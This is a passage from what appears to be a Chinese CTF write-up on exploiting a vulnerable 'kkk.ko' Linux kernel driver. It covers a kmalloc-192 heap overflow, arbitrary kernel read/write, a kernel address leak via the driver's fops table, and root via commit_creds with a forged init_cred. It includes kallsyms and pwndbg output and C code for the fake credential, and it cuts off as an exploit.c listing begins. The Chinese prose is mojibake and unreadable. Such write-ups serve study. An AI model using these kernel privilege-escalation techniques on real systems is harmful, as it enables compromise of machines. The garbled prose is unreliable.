    <span class="n">Run</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">r</span><span class="p">);</span>

    <span class="k">return</span><span class="p">;</span>
<span class="p">}</span>


<span class="c1">// 0xffff98df82d7ccc0
</span><span class="c1"></span>
<span class="c1">// 0xffff98df82d7cd80
</span><span class="c1"></span>

</code></pre></td></tr></table>
</div>
</div><p>å½“ add åˆ†é…æ—¶ï¼Œä¼šè°ƒç”¨ <code>kmalloc(obj-&gt;datapack.size + obj-&gt;keypack.size + 48)</code>ï¼Œæˆ‘ä»¬å°†å®ƒåˆ†é…çš„å †å—å…¨éƒ¨æ§åˆ¶åœ¨ <code>kmalloc-192</code> è¿™ä¸ª SLUB ä¸­ï¼Œå¹¶ä½¿å®ƒä»¬åœ°å€è¿ç»­ï¼ˆå¦‚æœä¸è¿ç»­å°±å¤šåˆ†é…å‡ ä¸ªï¼Œç›´åˆ°è¿ç»­ï¼‰ã€‚è¿™ä¸ª PoC çš„é€»è¾‘æ˜¯ï¼šè®© SLUB åˆ†é…ä¸¤ä¸ªåœ°å€è¿ç»­çš„ <code>kmalloc-192</code> å †å—ï¼Œå…¶ id åˆ†åˆ«æ˜¯ 0 å’Œ 1ï¼Œé€šè¿‡ <code>Run()</code> è§¦å‘å¯¹ <code>id=0</code> çš„å †å—çš„ <code>kkk_aes256_cb</code> åŠ å¯†ã€‚é€šè¿‡åŠ å¯†å‰ï¼Œå †å—å†…å®¹å¦‚ä¸‹</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://s2.loli.net/2022/07/14/pYCxTnwQIkZjcyv.png"
        data-srcset="https://s2.loli.net/2022/07/14/pYCxTnwQIkZjcyv.png, https://s2.loli.net/2022/07/14/pYCxTnwQIkZjcyv.png 1.5x, https://s2.loli.net/2022/07/14/pYCxTnwQIkZjcyv.png 2x"
        data-sizes="auto"
        alt="https://s2.loli.net/2022/07/14/pYCxTnwQIkZjcyv.png"
        title="https://s2.loli.net/2022/07/14/pYCxTnwQIkZjcyv.png" /></p>
<p>é€šè¿‡åŠ å¯†åï¼Œç”±äºå¯¹é½åŸå› é€ æˆå †æº¢å‡ºï¼Œè¦†ç›–äº†ç›¸é‚»ä¸‹æ–¹ <code>id=1</code> å †å—çš„ <code>keypack.size</code> ä¸ <code>keypack.ptr</code> åŒºåŸŸã€‚</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://s2.loli.net/2022/07/14/pBhu2qF54WymkRJ.png"
        data-srcset="https://s2.loli.net/2022/07/14/pBhu2qF54WymkRJ.png, https://s2.loli.net/2022/07/14/pBhu2qF54WymkRJ.png 1.5x, https://s2.loli.net/2022/07/14/pBhu2qF54WymkRJ.png 2x"
        data-sizes="auto"
        alt="https://s2.loli.net/2022/07/14/pBhu2qF54WymkRJ.png"
        title="https://s2.loli.net/2022/07/14/pBhu2qF54WymkRJ.png" /></p>
<h3 id="åˆ©ç”¨-1">åˆ©ç”¨</h3>
<p>å †æº¢å‡ºä¹‹åæˆ‘ä»¬å¯ä»¥ä¿®æ”¹ <code>keypack.size</code> ä¸ <code>keypack.ptr</code> åŒºåŸŸï¼Œé…åˆ <code>update</code> ä¸ <code>dump</code> åŠŸèƒ½ï¼Œå®é™…ä¸Šå°±å¯ä»¥åšåˆ°å†…æ ¸åŒºåŸŸä»»æ„åœ°å€è¯»å†™ã€‚ä½†å †ä¸Šåªæœ‰ SLUB åœ°å€å’Œ kkk.ko çš„åœ°å€ï¼Œå†…æ ¸ä»£ç æ®µåœ°å€ä¸å¾—è€ŒçŸ¥ã€‚å¾ˆè‡ªç„¶æƒ³åˆ°çš„ä¸€ä¸ªæ–¹å¼æ˜¯ï¼šä¿®æ”¹ <code>fork</code> å‡ºæ¥çš„å­è¿›ç¨‹çš„ <code>cred</code> ç»“æ„ä½“ã€‚</p>
<h4 id="fork--zero-cred">fork &amp; zero <code>cred</code></h4>
<p><a href="https://xidoo.top/2021/08/slab_buddy_system0/#birds-eye-view" target="_blank" rel="noopener noreffer">SLUB åˆ†é…è§„åˆ™</a>æ¯”è¾ƒç®€å•ï¼Œè¿™é‡Œåªéœ€è¦æ³¨æ„ä¸‰ç‚¹ï¼š</p>
<ol>
<li><code>cred</code> ç»“æ„ä½“å¤§å°è¿›çš„æ˜¯ <code>kmalloc-192</code> è¿™ä¸ª SLUB</li>
<li>ä¸åŒå¤§å°çš„ SLUB åˆ†é…åœ°å€ç›¸å·®åä¸‡å…«åƒé‡Œ</li>
<li>ç”±äº <code>kmalloc-192</code> çš„åˆå§‹åˆ†é…æƒ…å†µæœªçŸ¥ï¼Œå¯èƒ½å‡ºç°åˆ†é…æ—¶ä¸€ä¸ª <code>partial</code> é“¾ç”¨å®Œäº†æ¢äº†å¦ä¸€ä¸ªç­‰æƒ…å†µï¼Œå¯¼è‡´è¿ç»­åˆ†é…çš„ä¸¤ä¸ª SLUB åœ°å€ä¹Ÿä¸ç›¸é‚»ï¼Œæ‰€ä»¥å¾—å¤šè°ƒä¸€ä¸‹é¿å…è¿™ç§æƒ…å†µçš„å‘ç”Ÿã€‚</li>
</ol>
<p>æ‰€ä»¥æˆ‘ä»¬çš„æ€è·¯å°±æ˜¯è®©ä¸€ä¸ª <code>kmalloc-192</code> æº¢å‡ºï¼Œè¦†ç›–åä¸€ä¸ª <code>kmalloc-192</code> çš„åŸŸï¼Œå†åˆ©ç”¨ç¨‹åºé€»è¾‘è¶Šç•Œå†™åœ¨åé¢è·Ÿç€çš„ <code>cred</code> ç»“æ„ä½“çš„ <code>kmalloc-192</code>ï¼Œæ¸…é›¶ uid ä½æ‹¿åˆ° root æƒé™ã€‚æœ¬æ¥åº”è¯¥æ˜¯å¯ä»¥çš„ï¼Œä½†æˆ‘åšåˆ°ä¸€åŠçªç„¶æ„è¯†åˆ°å¿˜äº† sandbox è¿™å›äº‹äº†ã€‚ã€‚å› ä¸ºè¿™é¢˜ä¸èƒ½ç›´æ¥æ‰“å†…æ ¸ï¼Œè¿˜æ˜¯å¾—ä» parser å¼€å§‹æ‰“ï¼Œæ‹¿ä¸åˆ° shell å¯¼è‡´è¿˜æ˜¯å¾—åœ¨ parser ç¨‹åºä¸­ç”¨ sandbox å…è®¸çš„ç³»ç»Ÿè°ƒç”¨æ¥ææƒï¼Œsandbox é‡Œä¸è®© <code>fork</code> &hellip;</p>
<p>åˆæƒ³åˆ° tty ç»“æ„ä½“ï¼Œå¦‚æœèƒ½åœ¨ SLUB ä¸­åˆ†é…ä¸€ä¸ª tty ç»“æ„ä½“å°±å¥½äº†ï¼Œè¯´ä¸å®šé‡Œé¢ç”±ä¸€äº›å†…æ ¸ä»£ç æ®µçš„åœ°å€ã€‚ä½†æ˜¯ <code>open(&quot;/dev/ptmx&quot;)</code> æ€»æ˜¯è¿”å› <code>errno=2</code> ï¼Œè¿™ä¸ªæ–‡ä»¶æ˜æ˜æ˜¯æœ‰çš„ï¼Œä½†æ˜¯ <code>cat</code> æç¤º No such file or directoryã€‚<a href="https://blog.csdn.net/yongbaoii/article/details/123924737" target="_blank" rel="noopener noreffer">æŸ¥äº†ä¸€ä¸‹</a>å¥½åƒæ˜¯ kernel å¯åŠ¨è„šæœ¬çš„é—®é¢˜ï¼Œé¶æœºä¸Šä¹Ÿæ²¡æ³•æ”¹å¯åŠ¨è„šæœ¬å•Š&hellip;é‚ä½œç½¢ã€‚</p>
<p>æœ‰ä¸€ç¯‡<a href="https://ptr-yudai.hatenablog.com/entry/2020/03/16/165628" target="_blank" rel="noopener noreffer">æ–‡ç« </a>æ€»ç»“äº†ä¸€ä¸‹å¸¸ç”¨çš„ç»“æ„ä½“ï¼Œä½†æ˜¯æ—¥æ–‡ç¿»è¯‘ä¹‹åæˆ‘éƒ½çœ‹ä¸å¤ªæ‡‚&hellip;æ‰¾åˆ°äº†ç›¸ä¼¼çš„å¦ä¸€ä»½<a href="https://kagehutatsu.com/?p=442" target="_blank" rel="noopener noreffer">ä¸­æ–‡èµ„æ–™</a>ï¼Œä¹Ÿæ²¡æ‰¾åˆ°é€‚åˆå¤§å°çš„ç»“æ„ä½“ã€‚</p>
<h4 id="çˆ†ç ´å†…æ ¸ä»£ç æ®µåœ°å€">çˆ†ç ´å†…æ ¸ä»£ç æ®µåœ°å€</h4>
<p>å…¶å®æ‹¿åˆ°å†…æ ¸ä»£ç æ®µåœ°å€å°±å¥½åŠäº†ï¼Œå½“æˆ‘ä»¬æ‹¿åˆ° <code>commit_creds</code> åœ°å€ä¹‹ååªéœ€è¦æŠŠå †ä¸Šçš„åŠ å¯†å‡½æ•°æŒ‡é’ˆè¦†ç›–æˆ <code>commit_creds</code> å°±è¡Œï¼Œå¹¶ä¸”åœ¨å †ä¸Šä¼ªé€ ä¸€ä¸ª <code>init_creds</code>ï¼Œè§¦å‘åŠ å¯†é€»è¾‘å³å¯æ‹¿åˆ° root æƒé™ï¼Œç„¶å orw è¯» flagã€‚è¿™æ˜¯ <a href="https://mp.weixin.qq.com/s/mF339elDBtjw1PCdBcXxxw" target="_blank" rel="noopener noreffer">Nu1L æˆ˜é˜Ÿé¢˜è§£</a>çš„æ€è·¯ã€‚</p>
<p>è™½ç„¶å†…æ ¸ä»£ç æ®µåªæœ‰ 12 ä¸ª bits åœ¨æ”¹å˜ï¼Œä½†æ˜¯è¿™é¢˜å¼€äº† kaslr å§&hellip;exp åœ°å€æ­£ç¡®çš„æ¦‚ç‡ä¸æ˜¯åªæœ‰ 1/2^12 å— &hellip;</p>
<blockquote>
<p>ä½†æ˜¯æ€ä¹ˆæ³„éœ²å†…æ ¸åœ°å€å‘¢? è¶Šç•Œè¯»åªèƒ½æ³„éœ²kkk.koçš„åœ°å€, ä¹Ÿæ²¡æ³•ROP, æƒ³äº†å¾ˆä¹…, æœ€ç»ˆè§£å†³â½…æ³•æ˜¯: çˆ†ç ´. å› ä¸ºå†…æ ¸åŸºåœ°å€çš„ç†µå¾ˆâ¼©, åªæœ‰24bit, â½½ä¸”å®æµ‹å‘ç°â¼¤å¤šæ•°æƒ…å†µéƒ½æ˜¯0x1F800000, 0x21100000è¿™æ ·â½è¾ƒâ¼©çš„æ•°å­—, å› æ­¤çˆ†ç ´èŠ±ä¸äº†å¤šâ»“æ—¶é—´çš„.</p>
</blockquote>
<p>æ„Ÿè§‰æ¦‚ç‡ä¹ŸæŒºä½å§&hellip; Nu1L çš„å¸ˆå‚…è¯´çˆ†äº†ä¸€ä¸ªå¤šå°æ—¶ã€‚</p>
<h4 id="æ³„éœ²å†…æ ¸ä»£ç æ®µåœ°å€">æ³„éœ²å†…æ ¸ä»£ç æ®µåœ°å€</h4>
<p>æ‹¿åˆ°å†…æ ¸ä»£ç æ®µåœ°å€è¿˜æœ‰å¦ä¸€ç§åŠæ³•ã€‚æˆ‘ä»¬ç°åœ¨é€šè¿‡è¦†ç›– <code>keypack.size</code> å¯ä»¥è¿›è¡Œè¶Šç•Œè¯»å†™ï¼Œç¯¡æ”¹åä¸€ä¸ªå †å—çš„å¤§å°å’ŒæŒ‡é’ˆåŸŸå°±èƒ½å®ç°çœŸæ­£æ„ä¹‰ä¸Šçš„ä»»æ„åœ°å€è¯»å†™ã€‚æˆ‘ä»¬å¯ä»¥å¾ˆè½»æ˜“çš„æ‹¿åˆ° SLUB åœ°å€å’Œ kkk.ko çš„åŠ è½½åœ°å€ï¼ˆè¶Šç•Œè¯»æ‹¿åˆ° <code>handler</code> å‡½æ•°åœ°å€ï¼‰ç°åœ¨çš„é—®é¢˜å°±æ˜¯èƒ½ä¸èƒ½åœ¨ SLUB æ®µæˆ–æ˜¯ kkk.ko æ®µæ‰¾åˆ°ä¸€ä¸ªæœ‰ kernel æ®µä»£ç åœ°å€çš„åœ°æ–¹å‘¢ï¼Ÿ</p>
<p>å®é™…ä¸Šæ˜¯æœ‰çš„ï¼Œç”±äº kkk.ko çš„ fops æ²¡æœ‰éƒ½è¢«é©±åŠ¨å®ç°ï¼ˆå®ç°äº†å°±åœ¨ kkk.koï¼Œæ²¡å®ç°å°±ç”¨ kernel åŸæœ¬çš„ï¼‰ï¼Œæ‰€ä»¥åœ¨ fops ä¸­å¯ä»¥æ‰¾åˆ° kernel åœ°å€ã€‚<a href="https://ctf.njupt.edu.cn/752.html#kkk" target="_blank" rel="noopener noreffer">X1cT34m æˆ˜é˜Ÿ</a> ä¸å‡ºé¢˜äººå¤§å“¥æ³„éœ² kernel åœ°å€çš„æ€è·¯éƒ½æ˜¯å¦‚æ­¤ã€‚</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">/ # cat /proc/kallsyms | grep kkk
ffffffffc0000000 t kkk_write    [kkk]
ffffffffc0000010 t enc_dec_internal     [kkk]
ffffffffc0000130 t kkk_aes256_cb        [kkk]
ffffffffc0000290 t kkk_aes128_cb        [kkk]
ffffffffc00003d0 t kkk_tdes_cb  [kkk]
ffffffffc0000510 t kkk_des_cb   [kkk]
ffffffffc0000620 t kkk_close    [kkk]
ffffffffc0000670 t kkk_open     [kkk]
ffffffffc00006b0 t kkk_read     [kkk]
ffffffffc00006c0 t kkk_unlocked_ioctl   [kkk]
ffffffffc00009f0 t kkk_compat_ioctl     [kkk]
ffffffffc00009f5 t kkk_exit     [kkk]
ffffffffc0001180 r kkk_fops     [kkk]   # !!!
ffffffffc000109f r .LC12        [kkk]
ffffffffc0001694 r _note_9      [kkk]
ffffffffc00016ac r _note_8      [kkk]
ffffffffc00020c0 d __this_module        [kkk]
ffffffffc00009f5 t cleanup_module       [kkk]
ffffffffc0002060 d handlers     [kkk]
ffffffffc0002000 d kkk_device   [kkk]

pwndbg&gt; x/10xg  0xffffffffc0001180
0xffffffffc0001180:     0xffffffffc00020c0      0xffffffff812258e0
0xffffffffc0001190:     0xffffffffc00006b0      0xffffffffc0000000
0xffffffffc00011a0:     0x0000000000000000      0x0000000000000000
0xffffffffc00011b0:     0x0000000000000000      0x0000000000000000
0xffffffffc00011c0:     0x0000000000000000      0x0000000000000000
</code></pre></td></tr></table>
</div>
</div><h4 id="privilege-escalation">privilege escalation</h4>
<p>æ‹¿åˆ° kernel åœ°å€å°±å¥½åŠå•¦ï¼Œè¿™é‡Œæˆ‘ä»¬ä¹Ÿæœ‰ä¸‰ç§æ–¹æ³•</p>
<ul>
<li>
<p>Nu1L: ä¿®æ”¹åŠ å¯† <code>handler</code> ä¸º <code>commit_creds</code> ï¼Œåœ¨å½“å‰å—ä¼ªé€ ä¸€ä¸ª <code>init_cred</code> ï¼Œè§¦å‘åŠ å¯†å³å¯ã€‚æ— éœ€è·³å›ç”¨æˆ·æ€ã€‚</p>
</li>
<li>
<p>X1cT34m &amp; AAAï¼ˆå‡ºé¢˜äººå¤§å“¥ï¼‰ï¼šæ‰¾ gadget æŠŠæ ˆè¿ç§»åˆ° SLUB ä¸Šåš ROPï¼Œåšå®Œéœ€è¦åœ†æ¶¦åœ°è¿”å›ç”¨æˆ·æ€ã€‚</p>
</li>
<li>
<p><a href="https://kagehutatsu.com/?p=696" target="_blank" rel="noopener noreffer">å½±äºŒã¤çš„åšå®¢</a>ï¼šé€šè¿‡ <code>init_task</code> ç»“æ„ä½“ï¼Œéå†å…¨éƒ¨çš„ <code>task_struct</code>ï¼Œæ‰¾åˆ°å½“å‰è¿›ç¨‹çš„ <code>cred</code> ï¼Œæ¸…é›¶ PID ä¾¿èƒ½æ‹¿åˆ° root æƒé™ã€‚æ— éœ€è·³å›ç”¨æˆ·æ€ã€‚</p>
</li>
<li>
<p>å½“ç„¶ï¼Œæ‰¾åˆ°å½“å‰ <code>task_struct</code> ä¹‹åï¼Œä¹Ÿå¯ä»¥ç›´æ¥æŠŠ <code>cred</code> ç»“æ„ä½“æŒ‡é’ˆæ”¹æˆ <code>init_cred</code>ã€‚</p>
</li>
</ul>
<p>ç¬”è€…ä¸€å¼€å§‹å¤ç°æ—¶é‡‡ç”¨äº†ç¬¬ä¸€ç§æ–¹æ³•ï¼Œå› ä¸ºå®ƒçœ‹ä¸Šå»æ˜¯æœ€è‡ªç„¶çš„ã€‚<code>init_cred</code> æœ‰è¿™äº›ç»“æ„ï¼Œä¸€èˆ¬æ¥è¯´å®ƒè¢«èµ‹äºˆçš„å€¼è§<a href="https://cloudfuzz.github.io/android-kernel-exploitation/chapters/linux-privilege-escalation.html#process-credentials" target="_blank" rel="noopener noreffer">è¿™ç¯‡æ–‡ç« </a>.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="cm">/*
</span><span class="cm"> * The initial credentials for the initial task
</span><span class="cm"> */</span>
<span class="k">struct</span> <span class="n">cred</span> <span class="n">init_cred</span> <span class="o">=</span> <span class="p">{</span>
        <span class="p">.</span><span class="n">usage</span>                  <span class="o">=</span> <span class="n">ATOMIC_INIT</span><span class="p">(</span><span class="mi">4</span><span class="p">),</span>
<span class="cp">#ifdef CONFIG_DEBUG_CREDENTIALS
</span><span class="cp"></span>        <span class="p">.</span><span class="n">subscribers</span>            <span class="o">=</span> <span class="n">ATOMIC_INIT</span><span class="p">(</span><span class="mi">2</span><span class="p">),</span>
        <span class="p">.</span><span class="n">magic</span>                  <span class="o">=</span> <span class="n">CRED_MAGIC</span><span class="p">,</span>
<span class="cp">#endif
</span><span class="cp"></span>        <span class="p">.</span><span class="n">uid</span>                    <span class="o">=</span> <span class="n">GLOBAL_ROOT_UID</span><span class="p">,</span>
        <span class="p">.</span><span class="n">gid</span>                    <span class="o">=</span> <span class="n">GLOBAL_ROOT_GID</span><span class="p">,</span>
        <span class="p">.</span><span class="n">suid</span>                   <span class="o">=</span> <span class="n">GLOBAL_ROOT_UID</span><span class="p">,</span>
        <span class="p">.</span><span class="n">sgid</span>                   <span class="o">=</span> <span class="n">GLOBAL_ROOT_GID</span><span class="p">,</span>
        <span class="p">.</span><span class="n">euid</span>                   <span class="o">=</span> <span class="n">GLOBAL_ROOT_UID</span><span class="p">,</span>
        <span class="p">.</span><span class="n">egid</span>                   <span class="o">=</span> <span class="n">GLOBAL_ROOT_GID</span><span class="p">,</span>
        <span class="p">.</span><span class="n">fsuid</span>                  <span class="o">=</span> <span class="n">GLOBAL_ROOT_UID</span><span class="p">,</span>
        <span class="p">.</span><span class="n">fsgid</span>                  <span class="o">=</span> <span class="n">GLOBAL_ROOT_GID</span><span class="p">,</span>
        <span class="p">.</span><span class="n">securebits</span>             <span class="o">=</span> <span class="n">SECUREBITS_DEFAULT</span><span class="p">,</span>
        <span class="p">.</span><span class="n">cap_inheritable</span>        <span class="o">=</span> <span class="n">CAP_EMPTY_SET</span><span class="p">,</span>
        <span class="p">.</span><span class="n">cap_permitted</span>          <span class="o">=</span> <span class="n">CAP_FULL_SET</span><span class="p">,</span>
        <span class="p">.</span><span class="n">cap_effective</span>          <span class="o">=</span> <span class="n">CAP_FULL_SET</span><span class="p">,</span>
        <span class="p">.</span><span class="n">cap_bset</span>               <span class="o">=</span> <span class="n">CAP_FULL_SET</span><span class="p">,</span>
        <span class="p">.</span><span class="n">user</span>                   <span class="o">=</span> <span class="n">INIT_USER</span><span class="p">,</span>
        <span class="p">.</span><span class="n">user_ns</span>                <span class="o">=</span> <span class="o">&amp;</span><span class="n">init_user_ns</span><span class="p">,</span>
        <span class="p">.</span><span class="n">group_info</span>             <span class="o">=</span> <span class="o">&amp;</span><span class="n">init_groups</span><span class="p">,</span>
<span class="p">};</span>
</code></pre></td></tr></table>
</div>
</div><p>çœ‹ä¸Šå»åªè¦ <code>.usage = 4</code>ï¼Œå…¶ä»–çš„å…¨ 0 å°±å®Œäº‹äº†ã€‚ä½†å®é™…ä¸Šå¹¶ä¸æ˜¯ã€‚ç»è¿‡æµ‹è¯•åœ¨ <code>ptr[15]</code> å¤„éœ€è¦å¡«å……ä¸€å¤„å¯è¯»å†™çš„åœ°å€ï¼ˆå¡« SLUB åœ°å€å°±è¡Œï¼‰ï¼Œè¿™æ ·å°±å¯ä»¥æˆåŠŸæ‰§è¡Œ <code>commit_creds</code> æ‹¿åˆ° root æƒé™ã€‚Nu1L é¢˜è§£è¿™æ ·å°±è¡Œï¼Œä½†æ˜¯æˆ‘å¤ç°çš„æ—¶å€™å‘ç°åç»­ <code>open(&quot;/flag&quot;)</code> å†æ¬¡ syscall read çš„æ—¶å€™ä¼šå‡ºç°æ®µé”™è¯¯ï¼Œé”™è¯¯ç°åœºèƒ½æ¨æµ‹å‡ºæ˜¯ <code>cred</code> ç»“æ„ä½“ä¼ªé€ æœ‰è¯¯ã€‚æœ€åç»è¿‡åå¤å°è¯•å‘ç° <code>ptr[17]</code> å¤„éœ€è¦å’Œ <code>init_cred</code> è¯¥å¤„çš„å€¼ä¿æŒä¸€è‡´ï¼Œè¿™ä¸ªå€¼åœ¨ kernel çš„æŸä¸ªæ•°æ®æ®µï¼Œå’Œ kernel ä»£ç æ®µåç§»è²Œä¼¼æ˜¯æœ‰æ¦‚ç‡ä¸å˜çš„ã€‚</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c">    <span class="n">ptr</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="mi">4</span><span class="p">;</span>
    <span class="n">ptr</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="n">ptr</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="n">ptr</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="n">ptr</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="n">ptr</span><span class="p">[</span><span class="mi">5</span><span class="p">]</span> <span class="o">=</span> <span class="n">commit_creds</span><span class="p">;</span>

    <span class="n">ptr</span><span class="p">[</span><span class="mi">6</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x1FFFFFFFFF</span><span class="p">;</span>
    <span class="n">ptr</span><span class="p">[</span><span class="mi">7</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x1FFFFFFFFF</span><span class="p">;</span>
    <span class="n">ptr</span><span class="p">[</span><span class="mi">8</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x1FFFFFFFFF</span><span class="p">;</span>

    <span class="n">ptr</span><span class="p">[</span><span class="mi">15</span><span class="p">]</span> <span class="o">=</span> <span class="n">slub_addr</span><span class="p">;</span>
    <span class="c1">// ptr[16] = 0xffffffff8284ef80;
</span><span class="c1"></span>    <span class="c1">// ptr[17] = 0xffffffff8284f020;
</span><span class="c1"></span>    <span class="n">ptr</span><span class="p">[</span><span class="mi">17</span><span class="p">]</span> <span class="o">=</span> <span class="n">commit_creds</span> <span class="o">-</span> <span class="mh">0xffffffff8109bcf0</span> <span class="o">+</span> <span class="mh">0xffffffff8284f020</span><span class="p">;</span>
    <span class="c1">// ptr[18] = 0xffffffff82850e20;
</span><span class="c1"></span>    <span class="c1">// ptr[19] = 0xffffffff82850610;
</span></code></pre></td></tr></table>
</div>
</div><p>è®¤ä¸ºè¿™ä¸ªåœ°å€å’Œä»£ç æ®µåç§»ä¸å˜çš„è¯ï¼Œæœ€ç»ˆå†™å‡ºå¦‚ä¸‹ exploit.cï¼Œå®æµ‹æ˜¯æœ‰å¾ˆå¤§æ¦‚ç‡å¯ä»¥æ‰“é€šçš„ã€‚</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">  1
</span><span class="lnt">  2
</span><span class="lnt">  3
</span><span class="lnt">  4
</span><span class="lnt">  5
</span><span class="lnt">  6
</span><span class="lnt">  7
</span><span class="lnt">  8
</span><span class="lnt">  9
</span><span class="lnt"> 10
</span><span class="lnt"> 11
</span><span class="lnt"> 12
</span><span class="lnt"> 13
</span><span class="lnt"> 14
</span><span class="lnt"> 15
</span><span class="lnt"> 16
</span><span class="lnt"> 17
</span><span class="lnt"> 18
</span><span class="lnt"> 19
</span><span class="lnt"> 20
</span><span class="lnt"> 21
</span><span class="lnt"> 22
</span><span class="lnt"> 23
</span><span class="lnt"> 24
</span><span class="lnt"> 25
</span><span class="lnt"> 26
</span><span class="lnt"> 27
</span><span class="lnt"> 28
</span><span class="lnt"> 29
</span><span class="lnt"> 30
</span><span class="lnt"> 31
</span><span class="lnt"> 32
</span><span class="lnt"> 33
</span><span class="lnt"> 34
</span><span class="lnt"> 35
</span><span class="lnt"> 36
</span><span class="lnt"> 37
</span><span class="lnt"> 38
</span><span class="lnt"> 39
</span><span class="lnt"> 40
</span><span class="lnt"> 41
</span><span class="lnt"> 42
</span><span class="lnt"> 43
</span><span class="lnt"> 44
</span><span class="lnt"> 45
</span><span class="lnt"> 46
</span><span class="lnt"> 47
</span><span class="lnt"> 48
</span><span class="lnt"> 49
</span><span class="lnt"> 50
</span><span class="lnt"> 51
</span><span class="lnt"> 52
</span><span class="lnt"> 53
</span><span class="lnt"> 54
</span><span class="lnt"> 55
</span><span class="lnt"> 56
</span><span class="lnt"> 57
</span><span class="lnt"> 58
</span><span class="lnt"> 59
</span><span class="lnt"> 60
</span><span class="lnt"> 61
</span><span class="lnt"> 62
</span><span class="lnt"> 63
</span><span class="lnt"> 64
</span><span class="lnt"> 65
</span><span class="lnt"> 66
</span><span class="lnt"> 67
</span><span class="lnt"> 68
</span><span class="lnt"> 69
</span><span class="lnt"> 70
</span><span class="lnt"> 71
</span><span class="lnt"> 72
</span><span class="lnt"> 73
</span><span class="lnt"> 74
</span><span class="lnt"> 75
</span><span class="lnt"> 76
</span><span class="lnt"> 77
</span><span class="lnt"> 78
</span><span class="lnt"> 79
</span><span class="lnt"> 80
</span><span class="lnt"> 81
</span><span class="lnt"> 82
</span><span class="lnt"> 83
</span><span class="lnt"> 84
</span><span class="lnt"> 85
</span><span class="lnt"> 86
</span><span class="lnt"> 87
</span><span class="lnt"> 88
</span><span class="lnt"> 89
</span><span class="lnt"> 90
</span><span class="lnt"> 91
</span><span class="lnt"> 92
</span><span class="lnt"> 93
</span><span class="lnt"> 94
</span><span class="lnt"> 95
</span><span class="lnt"> 96
</span><span class="lnt"> 97
</span><span class="lnt"> 98
</span><span class="lnt"> 99
</span><span class="lnt">100
</span><span class="lnt">101
</span><span class="lnt">102
</span><span class="lnt">103
</span><span class="lnt">104
</span><span class="lnt">105
</span><span class="lnt">106
</span><span class="lnt">107
</span><span class="lnt">108
</span><span class="lnt">109
</span><span class="lnt">110
</span><span class="lnt">111
</span><span class="lnt">112
</span><span class="lnt">113
</span><span class="lnt">114
</span><span class="lnt">115
</span><span class="lnt">116
</span><span class="lnt">117
</span><span class="lnt">118
</span><span class="lnt">119
</span><span class="lnt">120
</span><span class="lnt">121
</span><span class="lnt">122
</span><span class="lnt">123
</span><span class="lnt">124
</span><span class="lnt">125
</span><span class="lnt">126
</span><span class="lnt">127
</span><span class="lnt">128
</span><span class="lnt">129
</span><span class="lnt">130
</span><span class="lnt">131
</span><span class="lnt">132
</span><span class="lnt">133
</span><span class="lnt">134
</span><span class="lnt">135
</span><span class="lnt">136
</span><span class="lnt">137
</span><span class="lnt">138
</span><span class="lnt">139
</span><span class="lnt">140
</span><span class="lnt">141
</span><span class="lnt">142
</span><span class="lnt">143
</span><span class="lnt">144
</span><span class="lnt">145
</span><span class="lnt">146
</span><span class="lnt">147
</span><span class="lnt">148
</span><span class="lnt">149
</span><span class="lnt">150
